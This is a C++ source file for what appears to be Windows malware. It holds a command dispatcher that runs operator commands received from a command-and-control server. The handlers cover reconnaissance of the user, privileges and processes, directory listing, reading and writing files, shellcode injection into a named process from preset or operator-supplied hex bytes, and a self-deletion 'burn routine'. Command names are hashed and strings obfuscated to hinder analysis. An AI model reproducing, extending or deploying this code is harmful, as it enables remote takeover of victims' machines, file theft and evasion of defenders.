#include "Core/dispatcher.h"
#include "Core/api_resolve.h"
#include "Crypto/hashing.h"
#include "Crypto/encryption.h"
#include "Crypto/obfuscation.h"
#include "Network/c2_server.h"
#include "Modules/recon.h"
#include "Modules/file_io.h"
#include "Modules/injection.h"
#include "Modules/suicide.h"
#include "Utils/helpers.h"
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>

void execstealth(SOCKET s, char *cmd) {
    API_TABLE& API = GetAPI();
    CleanAndParse(cmd);

    char commandName[16] = {0};
    sscanf(cmd, "%15s", commandName);
    QWORD nameHash = HashString(commandName);


    char* arguments = strchr(cmd, ' ');
    if (arguments) {
        while (*arguments == ' ') arguments++; 
    }    

    switch (nameHash) {
        case 0xC10D6DEBB9DF5BD7:  //whoami
            {
            wchar_t username[256] = {0};
            user_id(username);

            if (wcslen(username) > 0) {
                char response[512];
                snprintf(response, sizeof(response), STR("Current User: %ls").get(), username);
                sendToC2(response);
            }
            break;
        }
        case 0x290663888C0C6421:   //admin
            {
            //const char* result = IsAdmin() ? STR("Privileges: Administrator") : STR("Privileges: Standard User");

            const char* result;

            if(IsAdmin()){
                sendToC2(STR("Privileges: Administrator"));
            }else{
                sendToC2(STR("Privileges: Standard User"));
            }

            //sendToC2(result);

            break;
         }
        case 0x1CBB08C04709D135:  //tasklist
            {
            GetProcessList();
            
            break;
            }      

        case 0x0A45249A81624E12:    //dir
            {
                if (arguments && strlen(arguments) > 0) {
                    char fullPath[MAX_PATH] = {0};
                    char ntPfx[] = {'\\','?','?','\\','\0'};
                    // Check if path already has NT prefix
                    if (strncmp(arguments, ntPfx, 4) != 0) {
                        strcpy(fullPath, ntPfx);
                        strcat(fullPath, arguments);
                    } else {
                        strncpy(fullPath, arguments, MAX_PATH - 1);
                    }

                    wchar_t wPath[MAX_PATH];
                    size_t outSize;
                    mbstowcs_s(&outSize, wPath, fullPath, MAX_PATH - 1);
                    Internal_Dir(wPath);
                } else {
                    // Default path
                    wchar_t defPath[] = {'\\','?','?','\\','C',':','\\','\0'};
                    Internal_Dir(defPath);
                }
            break;
            }
        case 0x06350A5BC5E8425E:    //cat
            {
                if (arguments && strlen(arguments) > 0) {
                    char fullPath[MAX_PATH] = {0};
                    char ntPfx[] = {'\\','?','?','\\','\0'};
                    if (strncmp(arguments, ntPfx, 4) != 0) {
                        strcpy(fullPath, ntPfx);
                        strcat(fullPath, arguments);
                    } else {
                        strncpy(fullPath, arguments, MAX_PATH - 1);
                    }

                    wchar_t wPath[MAX_PATH];
                    size_t outSize;
                    mbstowcs_s(&outSize, wPath, fullPath, MAX_PATH - 1);

                    Internal_Read(wPath);
                } else {
                    sendToC2(STR("Error: Read command requires a path."));
                }
            break;
            }

        case 0x7D14B8DA3B95D39F:     //touch
            {
                if (arguments && strlen(arguments) > 0) {
                    char pathPart[MAX_PATH] = {0};
                    
                    sscanf(arguments, "%259s", pathPart);
                    
                    const char* dataPart = strchr(arguments, ' ');
                    
                    if (dataPart) {
                        while (*dataPart == ' ') dataPart++;                     }

                    if (strlen(pathPart) > 0 && dataPart && strlen(dataPart) > 0) {
                        char fullPath[MAX_PATH] = {0};
                        char ntPfx[] = {'\\','?','?','\\','\0'};
                        if (strncmp(pathPart, ntPfx, 4) != 0) {
                            strcpy(fullPath, ntPfx);
                            strcat(fullPath, pathPart);
                        } else {
                            strncpy(fullPath, pathPart, MAX_PATH - 1);
                        }

                        wchar_t wPath[MAX_PATH];
                        size_t outSize;
                        mbstowcs_s(&outSize, wPath, fullPath, MAX_PATH - 1);

                        Internal_Write(wPath, dataPart);
                    } else {
                        sendToC2(STR("Usage: write [path] [data]"));
                    }
                }
            break;
            }
        case 0x6A66A39F04965F16:    //inject
            {
                if (arguments && strlen(arguments) > 0) {
                    char processName[MAX_PATH] = {0};
                    int payloadId = -1;
                    char hexPayload[4096] = {0};

                    PBYTE finalPayload = NULL;
                    SIZE_T finalSize = 0;
                    bool needsFree = false;

                    int parsedArgs = sscanf(arguments, "%s %d %s", processName, &payloadId, hexPayload);

                    if (parsedArgs < 2) {
                        sendToC2(STR("Usage: inject [process_name] [payload_id] [hex_payload (if id=0)]\n"));
                        break;
                    }

                    //Ready to go payloads
                    unsigned char payload_1[] = { 0x90, 0x90, 0x90, 0xCC }; 
                    unsigned char payload_2[] = { 0x90, 0x90, 0x90, 0xC3 };
                    unsigned char payload_3[] = { 0x90, 0x90, 0xEB, 0xFE };

                    //find PID
                    wchar_t wProcessName[MAX_PATH];
                    size_t outSize;
                    mbstowcs_s(&outSize, wProcessName, processName, MAX_PATH - 1);
                    
                    DWORD targetPid = GetPidByName(wProcessName);
                    
                    if (targetPid == 0) {
                        sendToC2(STR("Error: Process not found or not running."));
                        goto inject_cleanup;
                    }

                    if (payloadId == 1) {
                        finalPayload = payload_1;
                        finalSize = sizeof(payload_1);
                    } else if (payloadId == 2) {
                        finalPayload = payload_2;
                        finalSize = sizeof(payload_2);
                    } else if (payloadId == 3) {
                        finalPayload = payload_3;
                        finalSize = sizeof(payload_3);
                    } 
                    //custom payload 
                    else if (payloadId == 0 && parsedArgs == 3) {
                        size_t hexLen = strlen(hexPayload);
                        if (hexLen % 2 != 0) {
                            sendToC2(STR("Error: Invalid Hex Payload length. Must be even."));
                            goto inject_cleanup;
                        }

                        finalSize = hexLen / 2;
                        finalPayload = (PBYTE)malloc(finalSize);
                        
                        if (finalPayload) {
                            needsFree = true;
                            for (size_t i = 0; i < finalSize; i++) {
                                sscanf(&hexPayload[i * 2], "%2hhx", &finalPayload[i]);
                            }
                        } else {
                            sendToC2(STR("Error: Memory allocation failed."));
                            goto inject_cleanup;
                        }
                    } else {
                        sendToC2(STR("Error: Invalid Payload ID or missing custom hex data for ID 0."));
                        goto inject_cleanup;
                    }

                    //injection
                    if (finalPayload && finalSize > 0) {
                        if (Internal_Inject(targetPid, finalPayload, finalSize)) {
                            sendToC2(STR("Injection Successful!"));
                        } else {
                            sendToC2(STR("Injection Failed."));
                        }
                    }

                inject_cleanup:
                    if (needsFree && finalPayload) {
                        free(finalPayload);
                    }

                } else {
                    sendToC2(STR("Usage: inject [process_name] [payload_id] [hex_payload (if id=0)]"));
                }
            break;                        
            }


        case 0x3C0EED1700AD16B3:    //suicide
            {
                sendToC2(STR("Initiating burn routine"));
                
                //get malware path
                wchar_t currentPath[MAX_PATH] = {0};
                
                if (API.GetModuleFileNameW(NULL, currentPath, MAX_PATH) != 0) {
                    
                    //call suicide function
                    Internal_Suicide(currentPath);
                    
                } else {
                    sendToC2(STR("Error: Could not resolve module path for suicide routine."));
                }

                break;
            }
        default:
            
            break;
    }
}
